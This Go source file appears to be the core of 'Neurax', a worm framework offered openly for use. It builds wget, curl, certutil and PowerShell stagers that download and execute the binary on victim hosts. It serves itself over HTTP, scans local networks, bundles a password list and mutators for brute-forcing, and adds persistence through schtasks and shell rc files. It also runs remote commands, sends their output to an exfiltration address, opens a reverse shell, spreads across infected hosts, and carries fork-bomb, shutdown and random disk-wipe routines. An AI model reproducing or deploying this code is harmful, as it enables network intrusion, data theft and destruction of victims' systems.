package neurax

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mostlygeek/arp"
	coldfire "github.com/redcode-labs/Coldfire"
	"github.com/yelinaung/go-haikunator"
)

var InfectedHosts = []string{}
var ReceivedCommands = []string{}
var CommonPasswords = []string{
	"123456",
	"123456789",
	"password",
	"qwerty",
	"12345678",
	"12345",
	"123123",
	"111111",
	"1234",
	"1234567890",
	"1234567",
	"abc123",
	"1q2w3e4r5t",
	"q1w2e3r4t5y6",
	"iloveyou",
	"123",
	"000000",
	"123321",
	"1q2w3e4r",
	"qwertyuiop",
	"yuantuo2012",
	"654321",
	"qwerty123",
	"1qaz2wsx3edc",
	"password1",
	"1qaz2wsx",
	"666666",
	"dragon",
	"ashley",
	"princess",
	"987654321",
	"123qwe",
	"159753",
	"monkey",
	"q1w2e3r4",
	"zxcvbnm",
	"123123123",
	"asdfghjkl",
	"pokemon",
	"football"}

type __NeuraxConfig struct {
	Stager           string
	StagerSudo       bool
	StagerRetry      int
	Port             int
	CommPort         int
	CommProto        string
	LocalIp          string
	Path             string
	FileName         string
	Platform         string
	Cidr             string
	ScanPassive      bool
	ScanTimeout      int
	ScanAll          bool
	ScanFast         bool
	ScanFirst        []string
	ScanArpCache     bool
	ScanThreads      int
	ScanFullRange    bool
	Base64           bool
	ScanRequiredPort int
	Verbose          bool
	Remove           bool
	ScanInterval     string
	ReverseListener  string
	ReverseProto     string
	PreventReexec    bool
	ExfilAddr        string
	WordlistExpand   bool
	WordlistCommon   bool
	WordlistMutators []string
	AllocNum         int
}

var NeuraxConfig = __NeuraxConfig{
	Stager:           "random",
	StagerSudo:       false,
	StagerRetry:      0,
	Port:             6741, //coldfire.RandomInt(2222, 9999),
	CommPort:         7777,
	CommProto:        "udp",
	ScanRequiredPort: 0,
	LocalIp:          coldfire.GetLocalIp(),
	Path:             "random",
	FileName:         "random",
	Platform:         runtime.GOOS,
	Cidr:             coldfire.GetLocalIp() + "/24",
	ScanPassive:      false,
	ScanTimeout:      2,
	ScanAll:          false,
	ScanFast:         false,
	ScanFirst:        []string{},
	ScanArpCache:     false,
	ScanThreads:      10,
	ScanFullRange:    false,
	Base64:           false,
	Verbose:          false,
	Remove:           false,
	ScanInterval:     "2m",
	ReverseListener:  "none",
	ReverseProto:     "udp",
	PreventReexec:    true,
	ExfilAddr:        "none",
	WordlistExpand:   false,
	WordlistCommon:   false,
	WordlistMutators: []string{"single_upper", "encapsule"},
	AllocNum:         5,
}

//Verbose error printing
func ReportError(message string, e error) {
	if e != nil && NeuraxConfig.Verbose {
		fmt.Printf("ERROR %s: %s", message, e.Error())
		if NeuraxConfig.Remove {
			os.Remove(os.Args[0])
		}
	}
}

//Returns a command stager that downloads and executes current binary
func NeuraxStager() string {
	stagers := [][]string{}
	stager := []string{}
	paths := []string{}
	b64_decoder := ""
	sudo := ""
	stager_retry := strconv.Itoa(NeuraxConfig.StagerRetry + 1)
	windows_stagers := [][]string{
		[]string{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
		[]string{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
		[]string{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
	}
	linux_stagers := [][]string{
		[]string{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
		[]string{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
	}
	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
		"/etc/", "/usr/", "/usr/share/"}
	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
	switch NeuraxConfig.Platform {
	case "windows":
		stagers = windows_stagers
		paths = windows_save_paths
		if NeuraxConfig.Base64 {
			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
	case "linux", "darwin":
		stagers = linux_stagers
		paths = linux_save_paths
		if NeuraxConfig.Base64 {
			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
	}
	if NeuraxConfig.Stager == "random" {
		stager = coldfire.RandomSelectStrNested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == NeuraxConfig.Stager {
				stager = st
			}
		}
	}
	selected_stager_command := stager[1]
	if NeuraxConfig.Stager == "chain" {
		chained_commands := []string{}
		for s := range stagers {
			st := stagers[s]
			chained_commands = append(chained_commands, st[1])
		}
		separator := ";"
		if runtime.GOOS == "windows" {
			separator = "&&"
		}
		selected_stager_command = strings.Join(chained_commands, " "+separator+" ")
	}
	if NeuraxConfig.Path == "random" {
		NeuraxConfig.Path = coldfire.RandomSelectStr(paths)
	}
	if NeuraxConfig.FileName == "random" && NeuraxConfig.Platform == "windows" {
		NeuraxConfig.FileName += ".exe"
	}
	if NeuraxConfig.StagerSudo {
		sudo = "sudo"
	}
	url := fmt.Sprintf("http://%s:%d/%s", NeuraxConfig.LocalIp, NeuraxConfig.Port, NeuraxConfig.FileName)
	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", NeuraxConfig.FileName, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", NeuraxConfig.Path, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SUDO", sudo, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "RETRY", stager_retry, -1)
	return selected_stager_command
}

//Binary serves itself
func NeuraxServer() {
	/*if NeuraxConfig.prevent_reinfect {
		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
	}*/
	data, _ := ioutil.ReadFile(os.Args[0])
	if NeuraxConfig.Base64 {
		data = []byte(coldfire.B64E(string(data)))
	}
	addr := fmt.Sprintf(":%d", NeuraxConfig.Port)
	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		http.ServeContent(rw, r, NeuraxConfig.FileName, time.Now(), bytes.NewReader(data))
	}))
}

//Returns true if host is active
func IsHostActive(target string) bool {
	first := 19
	last := 300
	if NeuraxConfig.ScanFullRange {
		last = 65535
	}
	if NeuraxConfig.ScanFast {
		NeuraxConfig.ScanTimeout = 2
		NeuraxConfig.ScanThreads = 20
		first = 21
		last = 81
	}
	ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.ScanTimeout)*time.Second, NeuraxConfig.ScanThreads)
	opened_ports := ps.GetOpenedPort(first, last)
	if len(opened_ports) != 0 {
		if NeuraxConfig.ScanRequiredPort == 0 {
			return true
		} else {
			if coldfire.PortscanSingle(target, NeuraxConfig.ScanRequiredPort) {
				return true
			}
		}
	}
	return false
}

//Returns true if host is infected
func IsHostInfected(target string) bool {
	if coldfire.Contains(InfectedHosts, target) {
		return true
	}
	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.Port)
	rsp, err := http.Get(target_url)
	if err != nil {
		return false
	}
	if rsp.StatusCode == 200 {
		InfectedHosts = append(InfectedHosts, target)
		InfectedHosts = coldfire.RemoveFromSlice(InfectedHosts, coldfire.GetLocalIp())
		return true
	}
	return false
}

/*func handle_revshell_conn() {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func NeuraxSignal(addr string) {
	conn, err := net.Dial("udp", addr)
	ReportError("Cannot establish reverse UDP conn", err)
	for {
		handle_revshell_conn(conn)
	}
}*/

func add_persistent_command(cmd string) {
	if runtime.GOOS == "windows" {
		coldfire.CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
	} else {
		coldfire.CmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
	}
}

func handle_command(cmd string) {
	if NeuraxConfig.PreventReexec {
		if coldfire.Contains(ReceivedCommands, cmd) {
			return
		}
		ReceivedCommands = append(ReceivedCommands, cmd)
	}
	DataSender := coldfire.SendDataUDP
	forwarded_preamble := ""
	if NeuraxConfig.CommProto == "tcp" {
		DataSender = coldfire.SendDataTCP
	}
	preamble := strings.Fields(cmd)[0]
	can_execute := true
	no_forward := false
	if strings.Contains(preamble, "e") {
		if !coldfire.IsRoot() {
			can_execute = false
		}
	}
	if strings.Contains(preamble, "k") {
		forwarded_preamble = preamble
	}
	if strings.Contains(preamble, ":") {
		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
		if strings.Contains(preamble, "s") {
			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
		}
		if strings.Contains(preamble, "p") {
			add_persistent_command(cmd)
		}
		if strings.Contains(preamble, "x") && can_execute {
			out, err := coldfire.CmdOut(cmd)
			if err != nil {
				if strings.Contains(preamble, "!") {
					no_forward = true
				}
				out += ": " + err.Error()
			}
			if strings.Contains(preamble, "d") {
				fmt.Println(out)
			}
			if strings.Contains(preamble, "v") {
				host := strings.Split(NeuraxConfig.ExfilAddr, ":")[0]
				port := strings.Split(NeuraxConfig.ExfilAddr, ":")[1]
				p, _ := strconv.Atoi(port)
				coldfire.SendDataTCP(host, p, out)
			}
			if strings.Contains(preamble, "l") && can_execute {
				for {
					coldfire.CmdRun(cmd)
				}
			}
		}
		if strings.Contains(preamble, "a") && !no_forward {
			fmt.Println(InfectedHosts)
			for _, host := range InfectedHosts {
				err := DataSender(host, NeuraxConfig.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
				ReportError("Cannot send command", err)
				if strings.Contains(preamble, "o") && !strings.Contains(preamble, "m") {
					break
				}
			}
		}
		if strings.Contains(preamble, "r") {
			coldfire.Remove()
			os.Exit(0)
		}
		if strings.Contains(preamble, "q") {
			coldfire.Shutdown()
		}
		if strings.Contains(preamble, "f") {
			coldfire.Forkbomb()
		}
	} else {
		if cmd == "purge" {
			NeuraxPurgeSelf()
		}
		coldfire.CmdOut(cmd)
	}
}

//Opens port (.CommPort) and waits for commands
func NeuraxOpenComm() {
	l, err := net.Listen(NeuraxConfig.CommProto, "0.0.0.0:"+strconv.Itoa(NeuraxConfig.CommPort))
	ReportError("Comm listen error", err)
	for {
		conn, err := l.Accept()
		ReportError("Comm accept error", err)
		buff := make([]byte, 1024)
		len, _ := conn.Read(buff)
		cmd := string(buff[:len-1])
		go handle_command(cmd)
		conn.Close()
	}
}

//Launches a reverse shell. Each received command is passed to handle_command()
func NeuraxReverse() {
	conn, _ := net.Dial(NeuraxConfig.ReverseProto, NeuraxConfig.ReverseListener)
	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			break
		}
		command = strings.TrimSuffix(command, "\n")
		go handle_command(command)
	}
}

func neurax_scan_passive_single_iface(c chan string, iface string) {
	var snapshot_len int32 = 1024
	timeout := 500 * time.Second
	if NeuraxConfig.ScanFast {
		timeout = 50 * time.Second
	}
	handler, err := pcap.OpenLive(iface, snapshot_len, false, timeout)
	ReportError("Cannot open device", err)
	handler.SetBPFFilter("arp")
	defer handler.Close()
	packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range packetSource.Packets() {
		ip_layer := packet.Layer(layers.LayerTypeIPv4)
		if ip_layer != nil {
			ip, _ := ip_layer.(*layers.IPv4)
			source := fmt.Sprintf("%s", ip.SrcIP)
			destination := fmt.Sprintf("%s", ip.DstIP)
			if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
				c <- source
			}
			if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
				c <- destination
			}
		}
	}
}

func neurax_scan_passive(c chan string) {
	current_iface, _ := coldfire.Iface()
	ifaces_to_use := []string{current_iface}
	device_names := []string{}
	devices, err := pcap.FindAllDevs()
	for _, dev := range devices {
		device_names = append(device_names, dev.Name)
	}
	ReportError("Cannot obtain network interfaces", err)
	if NeuraxConfig.ScanAll {
		ifaces_to_use = append(ifaces_to_use, device_names...)
	}
	for _, device := range ifaces_to_use {
		go neurax_scan_passive_single_iface(c, device)
	}
}

func neurax_scan_active(c chan string) {
	targets := []string{}
	if NeuraxConfig.ScanArpCache {
		for ip, _ := range arp.Table() {
			if !IsHostInfected(ip) {
				targets = append(targets, ip)
			}
		}
	}
	full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.Cidr)
	for _, addr := range full_addr_range {
		targets = append(targets, addr)
	}
	targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
	if len(NeuraxConfig.ScanFirst) != 0 {
		targets = append(NeuraxConfig.ScanFirst, targets...)
	}
	for _, target := range targets {
		fmt.Println("Scanning ", target)
		if IsHostActive(target) && !IsHostInfected(target) {
			fmt.Println("Scanned ", target)
			c <- target
		}
	}
}

func neurax_scan_core(c chan string) {
	if NeuraxConfig.ScanPassive {
		neurax_scan_passive(c)
	} else {
		neurax_scan_active(c)
	}
}

//Scans network for new hosts
func NeuraxScan(c chan string) {
	for {
		neurax_scan_core(c)
		time.Sleep(time.Duration(coldfire.IntervalToSeconds(NeuraxConfig.ScanInterval)))
	}
}

//Copies current binary to all found disks
func NeuraxDisks() error {
	selected_name := gen_haiku()
	if runtime.GOOS == "windows" {
		selected_name += ".exe"
	}
	disks, err := coldfire.Disks()
	if err != nil {
		return err
	}
	for _, d := range disks {
		err := coldfire.CopyFile(os.Args[0], d+"/"+selected_name)
		if err != nil {
			return err
		}
	}
	return nil
}

//Creates an infected .zip archive with given number of random files from current dir.
func NeuraxZIP(num_files int) error {
	archive_name := gen_haiku() + ".zip"
	files_to_zip := []string{os.Args[0]}
	files, err := coldfire.CurrentDirFiles()
	if err != nil {
		return err
	}
	for i := 0; i < num_files; i++ {
		index := rand.Intn(len(files_to_zip))
		files_to_zip = append(files_to_zip, files[index])
		files[index] = files[len(files)-1]
		files = files[:len(files)-1]
	}
	return coldfire.MakeZip(archive_name, files_to_zip)
}

//The binary zips itself and saves under save name in archive
func NeuraxZIPSelf() error {
	archive_name := os.Args[0] + ".zip"
	files_to_zip := []string{os.Args[0]}
	return coldfire.MakeZip(archive_name, files_to_zip)
}

func gen_haiku() string {
	haikunator := haikunator.New(time.Now().UTC().UnixNano())
	return haikunator.Haikunate()
}

//Removes binary from all nodes that can be reached
func NeuraxPurge() {
	DataSender := coldfire.SendDataUDP
	if NeuraxConfig.CommProto == "tcp" {
		DataSender = coldfire.SendDataTCP
	}
	for _, host := range InfectedHosts {
		err := DataSender(host, NeuraxConfig.CommPort, "purge")
		ReportError("Cannot perform purge", err)
	}
	handle_command("purge")
}

//Removes binary from host and quits
func NeuraxPurgeSelf() {
	os.Remove(os.Args[0])
	os.Exit(0)
}

func WordEncapsule(word string) []string {
	return []string{
		"!" + word + "!",
		"?" + word + "?",
		":" + word + ":",
		"@" + word + "@",
		"#" + word + "#",
		"$" + word + "$",
		"%" + word + "%",
		"^" + word + "^",
		"&" + word + "&",
		"*" + word + "*",
		"(" + word + ")",
		"[" + word + "",
		"<" + word + ">",
	}
}

func WordCyryllicReplace(word string) []string {
	wordlist := []string{}
	refs := map[string]string{
		"й": "q", "ц": "w", "у": "e",
		"к": "r", "е": "t", "н": "y",
		"г": "u", "ш": "i", "щ": "o",
		"з": "p", "ф": "a", "ы": "s",
		"в": "d", "а": "f", "п": "g",
		"р": "h", "о": "j", "л": "k",
		"д": "l", "я": "z", "ч": "x",
		"с": "c", "м": "v", "и": "b",
		"т": "n", "ь": "m"}

	rus_word := word
	for k, v := range refs {
		rus_word = strings.Replace(rus_word, k, v, -1)
	}
	wordlist = append(wordlist, rus_word)

	nrus_word := word
	for k, v := range refs {
		nrus_word = strings.Replace(nrus_word, v, k, -1)
	}
	wordlist = append(wordlist, nrus_word)

	return wordlist
}

func WordSingleUpperTransform(word string) []string {
	res := []string{}
	for i, _ := range word {
		splitted := strings.Fields(word)
		splitted[i] = strings.ToUpper(splitted[i])
		res = append(res, strings.Join(splitted, ""))
	}
	return res
}

func WordLeet(word string) []string {
	leets := map[string]string{
		"a": "4", "b": "3", "g": "9", "o": "0",
		"t": "7", "s": "5", "h": "#", "i": "1",
		"u": "v",
	}
	for k, v := range leets {
		word = strings.Replace(word, k, v, -1)
		word = strings.Replace(word, strings.ToUpper(k), v, -1)
	}
	return []string{word}
}

func WordRevert(word string) []string {
	return []string{coldfire.Revert(word)}
}

func RussianRoulette() error {
	if coldfire.RandomInt(1, 6) == 6 {
		return coldfire.Wipe()
	}
	return nil
}

//Returns transformed words from input slice
func NeuraxWordlist(words []string) []string {
	wordlist := []string{}
	if NeuraxConfig.WordlistCommon {
		wordlist = append(wordlist, CommonPasswords...)
	}
	for _, word := range words {
		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
		last_to_upper := word[:len(word)-1] + strings.ToUpper(string(word[len(word)]))
		wordlist = append(wordlist, strings.ToUpper(word))
		wordlist = append(wordlist, first_to_upper)
		wordlist = append(wordlist, last_to_upper)
		wordlist = append(wordlist, first_to_upper+"1")
		wordlist = append(wordlist, first_to_upper+"12")
		wordlist = append(wordlist, first_to_upper+"123")
		wordlist = append(wordlist, word+"1")
		wordlist = append(wordlist, word+"12")
		wordlist = append(wordlist, word+"123")
		if NeuraxConfig.WordlistExpand {
			if coldfire.Contains(NeuraxConfig.WordlistMutators, "encapsule") {
				wordlist = append(wordlist, WordEncapsule(word)...)
			}
			if coldfire.Contains(NeuraxConfig.WordlistMutators, "cyryllic") {
				wordlist = append(wordlist, WordCyryllicReplace(word)...)
			}
			if coldfire.Contains(NeuraxConfig.WordlistMutators, "single_upper") {
				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
			}
			if coldfire.Contains(NeuraxConfig.WordlistMutators, "leet") {
				wordlist = append(wordlist, WordLeet(word)...)
			}
			if coldfire.Contains(NeuraxConfig.WordlistMutators, "revert") {
				wordlist = append(wordlist, WordRevert(word)...)
			}
		}
	}
	return wordlist
}

func NeuraxSetTTL(interval string) {
	first_exec := time.Now()
	for {
		time.Sleep(time.Duration(10))
		passed := time.Since(first_exec).Seconds()
		if int(passed) > coldfire.IntervalToSeconds(interval) {
			NeuraxPurgeSelf()
		}
	}
}

func NeuraxMigrate(path string) error {
	current_path, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	if strings.Contains(current_path, path) {
		return nil
	}
	return coldfire.CopyFile(os.Args[0], path)
}

func NeuraxAlloc() {
	min_alloc := coldfire.SizeToBytes("10m")
	max_alloc := coldfire.SizeToBytes("600m")
	for n := 0; n < NeuraxConfig.AllocNum; n++ {
		num_bytes := coldfire.RandomInt(min_alloc, max_alloc)
		_ = make([]byte, num_bytes)
	}
}
